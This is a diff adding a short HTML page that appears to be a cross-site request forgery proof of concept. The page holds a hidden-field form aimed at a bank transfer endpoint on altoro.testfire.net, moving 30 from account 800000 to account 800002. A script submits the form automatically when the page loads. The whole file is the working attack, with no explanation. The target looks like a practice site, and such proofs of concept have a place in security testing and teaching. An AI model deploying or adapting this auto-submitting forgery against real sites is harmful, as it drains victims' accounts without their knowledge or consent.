@@ -1,0 +1,14 @@
+<html>
+<body>
+		<form method="POST"  name="foo" action="https://altoro.testfire.net/bank/doTransfer">
+			<input type="hidden" name="fromAccount" value="800000"/>
+			<input type="hidden" name="toAccount" value="800002"/>
+			<input type="hidden" name="transferAmount" value="30"/>
+			<input type="hidden" name="transfer" value="Transfer+Money"/>
+			<input type="submit" value="Submit">
+
+<script>
+document.foo.submit();
+</script>
+</body>
+</html>
